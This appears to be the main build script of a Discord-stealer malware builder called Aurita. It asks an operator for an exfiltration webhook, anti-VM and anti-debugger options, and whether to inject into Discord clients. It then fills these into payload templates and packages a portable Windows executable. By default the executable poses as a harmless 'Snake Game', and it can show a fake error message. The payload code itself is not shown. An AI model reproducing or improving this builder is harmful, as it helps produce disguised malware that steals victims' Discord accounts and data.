const { key_res, decode_B64, msg, is_webhook, is_link_icon } = require("./src/utils/functions/functions.js");
const { build, Platform, Arch } = require("electron-builder");
const { spawnSync } = require("child_process");
const readline = require("readline");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const gradient = require("gradient-string");
const chalk = require("chalk-animation");

const { atlas, instagram, summer } = gradient;
const { radar } = chalk;

const SRC_DIR = "./src";

const create_build = async (dest, JSON) => {
  const EXECUTABLE_NAME = JSON.EXECUTABLE_NAME ?? "Aurita";
  const EXECUTABLE_ICON = JSON.EXECUTABLE_ICON ?? "https://cdn.discordapp.com/attachments/1200154153226354779/1221510827517939743/05437e8b15bf60db9f5b995a1f791ab3.jpg?ex=662dde5b&is=662c8cdb&hm=e17935e0235643328f84cd1dbd519618a6f926859582386877b6d8b6e8425c45&";
  
  const TEMP_IMAGE_PATH = `${process.cwd()}/build/icons/${EXECUTABLE_NAME}.png`;
  const ICON_PATH = `${process.cwd()}/build/icons/${EXECUTABLE_NAME}.ico`;

  try {

    axios({
      method: 'get',
      url: EXECUTABLE_ICON,
      responseType: 'stream',
    }).then(response => {
      const WRITER = fs.createWriteStream(TEMP_IMAGE_PATH);

      response.data.pipe(WRITER);
      WRITER.on('finish', () => {
        require('image-to-ico')(TEMP_IMAGE_PATH, {
          size: [256, 256],
          quality: 100,
          greyscale: false
        }).then(buf => {
          fs.writeFileSync(ICON_PATH, buf);
          fs.unlinkSync(TEMP_IMAGE_PATH);
        }).catch(err => {
          console.log(`Error converting image to ICO: ${err}`)
        });
      });
    }).catch(err => {
      console.log(`Error downloading image: ${err}`)
    });

    await build({
      "targets": Platform.WINDOWS.createTarget(null, Arch.x64),
      "config": {
        "appId": "win32",
        "productName": `${EXECUTABLE_NAME}`,
        "win": {
          "artifactName": `${EXECUTABLE_NAME}.exe`,
          "target": "portable",
          "icon": ICON_PATH
        },
        "compression": "normal",
        "buildVersion": "1.0.0",
        "electronVersion": "17.1.0",
        "nodeGypRebuild": false,
        "npmRebuild": true,
        "directories": {
          "app": `${dest}`,
          "output": `./build/dist/${EXECUTABLE_NAME}`,
        },
      },
    });

    fs.unlinkSync(`./build/dist/${EXECUTABLE_NAME}/builder-debug.yml`);
    fs.unlinkSync(`./build/dist/${EXECUTABLE_NAME}/builder-effective-config.yaml`);

    fs.rmSync(`./build/dist/${EXECUTABLE_NAME}/win-unpacked`, {
      recursive: true
    });
    fs.rmSync(`${dest}`, {
      recursive: true
    });

    fs.rename(`./build/dist/${EXECUTABLE_NAME}/${EXECUTABLE_NAME}.exe`, `./${EXECUTABLE_NAME}.exe`, (err) => {
      if (err) console.error('The file is inside "./build/dist"'); else console.log(msg(`Executable file as "${EXECUTABLE_NAME}"`));
    });

  } catch (err) {
    console.log(err)
  }
}

const create_obfuscation = async (JSON) => {
  let WEBHOOK = JSON.WEBHOOK,
    EXECUTABLE_NAME = JSON.EXECUTABLE_NAME ?? "Aurita",
    EXECUTABLE_ICON = JSON.EXECUTABLE_ICON ?? "https://cdn.discordapp.com/attachments/1200154153226354779/1221510827517939743/05437e8b15bf60db9f5b995a1f791ab3.jpg?ex=662dde5b&is=662c8cdb&hm=e17935e0235643328f84cd1dbd519618a6f926859582386877b6d8b6e8425c45&",
    AUTHOR = JSON.AUTHOR ?? "k4itrun",
    LICENSE = JSON.LICENSE ?? "MIT",
    DESC = JSON.DESC ?? "Do Do-Hee <3",
    APP_COMPANY = JSON.APP_COMPANY ?? "Snake Company",
    COPYRIGHT = JSON.COPYRIGHT ?? "Snake Copyright",
    APP_FILE_DESC = JSON.DESC ?? "Snake Game",
    ERROR_MESSAGE = JSON.ERROR_MESSAGE ?? "",
    VM_DEBUGGER = JSON.VM_DEBUGGER,
    DC_INJECTION = JSON.DC_INJECTION,
    VERSION = JSON.VERSION ?? "2.0.0";

  let DEST_DIR = `./build/script/${EXECUTABLE_NAME}`;

  const clone_dir = (src, dest) => {
    try {
      if (!fs.existsSync(dest)) fs.mkdirSync(dest);
      fs.readdirSync(src).forEach((file) => {
        let SFP = path.join(src, file);
        let DFP = path.join(dest, file);
        if (fs.statSync(SFP).isFile()) fs.copyFileSync(SFP, DFP);
        else if (fs.statSync(SFP).isDirectory()) clone_dir(SFP, DFP);
      });
    } catch (e) {
      console.error(e)
    }
  };

  const obf_files = async (dir) => {
    try {
      const files = fs.readdirSync(dir);

      for (const file of files) {
        const FILE_PATH = path.join(dir, file);
        if (fs.statSync(FILE_PATH).isDirectory()) {
          await obf_files(FILE_PATH);
        } else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules") && !file.includes("build.js")) {

          await fs.writeFileSync(FILE_PATH, fs.readFileSync(FILE_PATH, "utf-8")); //later added better obfuscation

        }
      }
    } catch (e) {
      console.error(e)
    }
  };

  const replace_infos = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%DESCRIPTION%/g, DESC)
        .replace(/%AUTHOR%/g, AUTHOR)
        .replace(/%LICENSE%/g, LICENSE)
        .replace(/%APPCOMPAGNYNAME%/g, APP_COMPANY)
        .replace(/%COPYRIGHT%/g, COPYRIGHT)
        .replace(/%FILEDESCRIB%/g, APP_FILE_DESC)
        .replace(/%VERSION%/g, VERSION)
        .replace(/%VERSIONPRODUCT%/g, VERSION)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const replace_bat = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%DESTINATION%/g, DEST_DIR)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const replace_keys = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%WEBHOOK%/g, WEBHOOK)
        .replace(/%ERROR_MESSAGE%/g, ERROR_MESSAGE)
        .replace(/%VM_DEBUGGER%/g, VM_DEBUGGER)
        .replace(/%DC_INJECTION%/g, DC_INJECTION)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const traverse = (dir) => {
    try {
      fs.readdirSync(dir).forEach((file) => {
        const FILE_PATH = path.join(dir, file);
        if (fs.statSync(FILE_PATH).isDirectory()) { traverse(FILE_PATH) }
        else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules")) { replace_keys(FILE_PATH) }
        else if (file.endsWith(".json") && !FILE_PATH.includes("node_modules")) { replace_infos(FILE_PATH) }
        else if (file.endsWith("build.bat")) { replace_bat(FILE_PATH) }
      });
    } catch (e) {
      console.error(e)
    }
  };

  clone_dir(SRC_DIR, DEST_DIR);
  await traverse(DEST_DIR);
  await obf_files(DEST_DIR);

  return DEST_DIR;
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let CURRENT_QST = 0;

async function ask(qst) {
  try {
    CURRENT_QST++;
    return (await new Promise((resolve, reject) => {
      rl.question(atlas(`Question ${CURRENT_QST}: ${qst}`), (ans) => {
        resolve(ans);
      });
    })).trim();

  } catch (e) {
    console.error(e);
    return '';
  }
}

async function create_fucking() {
  const JSON = {};
  const MAIN_BANNER = decode_B64("CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0F1cmFUaGVtZXNdCgriloTiloTiloQgICAgICDiloggICAg4paI4paIIOKWiOKWiOKWgOKWiOKWiOKWiCAg4paE4paE4paEICAgIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWk+KWiOKWiOKWkSDilojilojilpPilojilojilojilojilogg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWk+KWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paICuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilojiloggIOKWk+KWiOKWiOKWk+KWiOKWiCDilpIg4paI4paI4paS4paI4paI4paI4paI4paEICDilpMgIOKWiOKWiOKWkiDilpPilpPilojilojilpEg4paI4paI4paT4paIICAg4paA4paT4paI4paI4paS4paA4paI4paAIOKWiOKWiOKWk+KWiCAgIOKWgOKWkuKWiOKWiCAgICDilpIK4paS4paI4paIICDiloDilojiloQg4paT4paI4paIICDilpLilojilojilpPilojilogg4paR4paE4paIIOKWkuKWiOKWiCAg4paA4paI4paE4paSIOKWk+KWiOKWiOKWkSDilpLilpLilojilojiloDiloDilojilojilpLilojilojiloggIOKWk+KWiOKWiCAgICDilpPilojilojilpLilojilojiloggIOKWkSDilpPilojilojiloQgICAK4paR4paI4paI4paE4paE4paE4paE4paI4paI4paT4paT4paIICDilpHilojilojilpLilojilojiloDiloDilojiloQg4paR4paI4paI4paE4paE4paE4paE4paI4paRIOKWk+KWiOKWiOKWkyDilpHilpHilpPilogg4paR4paI4paI4paS4paT4paIICDiloTilpLilojiloggICAg4paS4paI4paI4paS4paT4paIICDiloQgIOKWkiAgIOKWiOKWiOKWkgrilpPiloggICDilpPilojilojilpLilpLilojilojilojilojilojilpPilpHilojilojilpMg4paS4paI4paI4paS4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkeKWkeKWk+KWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWkiAgIOKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgrilpLilpIgICDilpPilpLilojilpHilpLilpPilpIg4paSIOKWkuKWkSDilpLilpMg4paR4paS4paT4paR4paS4paSICAg4paT4paS4paI4paR4paSIOKWkeKWkSAgIOKWkiDilpHilpHilpLilpHilpHilpEg4paS4paRIOKWkSDilpLilpEgICDilpEgIOKWkeKWkSDilpLilpEg4paSIOKWkuKWk+KWkiDilpIg4paRCuKWkiAgIOKWkuKWkiDilpHilpHilpLilpEg4paRIOKWkSAg4paR4paSIOKWkSDilpLilpEg4paSICAg4paS4paSIOKWkSAg4paRICAgIOKWkiDilpHilpLilpEg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpHilpEg4paRICDilpEg4paR4paSICDilpEg4paRCuKWkSAgIOKWkiAgIOKWkeKWkeKWkSDilpEg4paRICDilpHilpEgICDilpEgIOKWkSAgIOKWkiAgIOKWkSAgICAgIOKWkSAg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpEgICAgIOKWkSAg4paRICDilpEgIOKWkQrilpEgIOKWkSAg4paRICAgICAgIOKWkSAgICAgICAgICDilpEgIOKWkSAgICAgICDilpEgIOKWkSAg4paRICDilpEgIOKWkSAgICAgIOKWkSAgICAg4paRICDilpEgICAgIOKWkQogICAgICAgCQlBdXJhVGhlbWVzIEJ5IEs0aXRydW4gfCBodHRwczovL2Rpc2NvcmQuZ2cvYXVyYXRoZW1lcwkJCg");

  try {
    console.clear();

    radar(MAIN_BANNER).start();

    setTimeout(async () => {

      radar(summer(MAIN_BANNER)).stop();

      spawnSync(path.join(__dirname, SRC_DIR.replace("./", ""), "install.bat"), [], {
        cwd: path.join(__dirname, SRC_DIR.replace("./", "")),
        stdio: "inherit",
      });

      console.clear();
      console.log(instagram(MAIN_BANNER));

      let webhook = await ask("Add your \"WEBHOOK\": ");
      while (!is_webhook(webhook)) webhook = await ask("Add a \"WEBHOOK\" validity: ");

      let ex_icon =  await ask("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
      while (!is_link_icon(ex_icon)) ex_icon = await ask("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");

      JSON["WEBHOOK"] = webhook;
      JSON["EXECUTABLE_NAME"] = await ask("Please specify your 'EXE' file \"Name\": ");
      JSON["EXECUTABLE_ICON"] = ex_icon
      JSON["AUTHOR"] = await ask("Please specify your 'EXE' file \"Author\": ");
      JSON["LICENSE"] = await ask("Please specify your 'EXE' file \"License\": ");
      JSON["DESC"] = await ask("Please specify your 'EXE' file \"Description\": ");
      JSON["APP_COMPANY"] = await ask("Please specify your 'EXE' file \"App Company\": ");
      JSON["COPYRIGHT"] = await ask("Please specify your 'EXE' file \"Legal Copyright\": ");
      JSON["ERROR_MESSAGE"] = await ask("Please specify your 'EXE' file \"Alert Error Message\": ");
      JSON["VM_DEBUGGER"] = key_res(await ask("Block debug and VM? \"[Y or N]\": "));
      JSON["DC_INJECTION"] = key_res(await ask("Inject all Discord(s)? \"[Y or N]\": "));

      rl.close();
      console.clear();

      try {
        console.log(msg("Obfuscation..."))
        const OBF_PATH = await create_obfuscation(JSON);

        console.log(msg("Building..."))
        await create_build(OBF_PATH, JSON);

        console.log(msg("Filled..."))
      } catch (e) {
        console.error(e)
      }
    }, 5000);
  } catch (e) {
    console.error(e)
  }
}

create_fucking();